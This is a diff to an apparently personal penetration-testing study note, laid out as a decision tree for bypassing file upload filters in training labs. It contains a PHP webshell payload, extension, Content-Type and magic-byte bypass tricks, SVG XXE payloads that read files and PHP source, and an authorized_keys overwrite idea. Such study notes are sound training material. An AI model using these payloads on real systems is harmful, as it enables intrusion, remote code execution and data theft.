@@ -4,12 +4,41 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for file upload forms.
 
 ---
 
-### Found an upload form
-→ Try uploading a webshell (`.php`) directly first
-→ Blocked? Try a case-swapped extension (`.pHP`), or `.phps`/`.php7`, or upload as `.txt` then rename via the app's own rename feature
-→ IIS/ASP.NET target instead of PHP? Same idea, `/usr/share/webshells/aspx/cmdasp.aspx`, upload via the browser (viewstate tokens are painful with curl)
-→ Upload lands on a different port/path than where it's served from? Check the app's own text/behavior for clues about where uploads actually go
-→ See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] and [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 case study 4]]
+### Found an upload form — what filter is in place?
+
+Work through the bypass ladder in order:
+
+**Step 1: Is there any filter at all?** Upload `shell.php` directly. If it uploads and executes at `/uploads/shell.php`, you're done.
+
+**Step 2: Is the filter client-side only?** Open the upload page in a browser, can you see JavaScript validation in the source? Two bypasses:
+- Burp: upload a real image, intercept in Burp, change `filename="shell.php"` and replace image bytes with `<?php system($_REQUEST['cmd']); ?>`
+- DevTools: `Ctrl+Shift+C`, modify the form's `onSubmit` to remove the validation call, remove `accept=".jpg,.jpeg,.png"` from the file input
+
+**Step 3: Is it a blacklist?** `.php` blocked but other variants not. Try `.phar` first (most commonly missed). If that fails, fuzz extensions via Burp Intruder (PHP extensions list, disable URL encoding, markers around `.php`, sort by response length).
+
+**Step 4: Is it a whitelist?** Only image extensions allowed. Bypass:
+- Double extension `shell.php.jpg` (works if Apache handles `.php` anywhere in the name, a misconfiguration)
+- Reverse double extension `shell.phar.jpg` (`.phar` bypasses blacklist, `.jpg` satisfies whitelist end, use when combined blacklist + whitelist)
+
+**Step 5: Is there a Content-Type check?** The server checks the `Content-Type` header. In Burp, change it to `image/gif` or `image/svg+xml`. Fuzz all `image/` types via Intruder if not sure which is accepted.
+
+**Step 6: Is there a MIME type / magic bytes check?** The server calls `mime_content_type()` on the file content. Prepend `GIF8` to the file (4 bytes, marks it as a GIF). Combined payload: `GIF8\n<?php system($_REQUEST['cmd']); ?>`.
+
+→ See [[File Upload Attacks#Filter Bypass Techniques|Command Appendix]], [[File Upload Attacks (HTB Supplementary)]]
+
+### Upload form accepts only SVG images (or similarly restricted "safe" types)
+→ SVG is XML, inject XXE to read arbitrary files: `<!ENTITY xxe SYSTEM "/flag.txt">` → view page source after upload, file contents appear inside `<svg>`
+→ Read PHP source via SVG XXE + php://filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">` → base64-decode the blob in page source → reveals upload directory path and filename convention
+→ For RCE: create an SVG+PHP polyglot. SVG XML wrapper + `<?php system($_REQUEST['cmd']); ?>` in the same file. PHP executes the PHP block, ignoring the XML prefix. Use `.phar.svg` extension (`.phar` executes, `.svg` satisfies whitelist ending)
+→ If the frontend blocks `.svg` extension: save as `.jpeg`, intercept in Burp, change `filename` and `Content-Type: image/svg+xml` in the intercepted request
+→ See [[File Upload Attacks (HTB Supplementary)#FUA.6. Limited File Uploads|FUA.6]], [[File Upload Attacks#SVG XXE. File Read and PHP Source Disclosure|Command Appendix]]
+
+### You need to find the uploaded file path (it's not disclosed by the app)
+→ Try common paths: `/uploads/`, `/profile_images/`, `/img/`, `/files/`, `/media/`
+→ If you have LFI: use php://filter to read the upload handler source, look for `$target_dir`
+→ If the app has SVG upload: use SVG XXE with php://filter to read the upload handler source
+→ If the handler uses `date()` for filename prefix: `date +%y%m%d` gives today's prefix in `YYMMDD` format
+→ See [[File Upload Attacks (HTB Supplementary)#FUA.7. Skills Assessment|FUA.7]], [[File Upload Attacks#Upload Date-Prefixed Filename Prediction|Command Appendix]]
 
 ### Upload form works but nothing you upload ever executes
 → Check whether the `filename` field itself is traversal-able. If so, overwrite something like `authorized_keys` instead of relying on execution
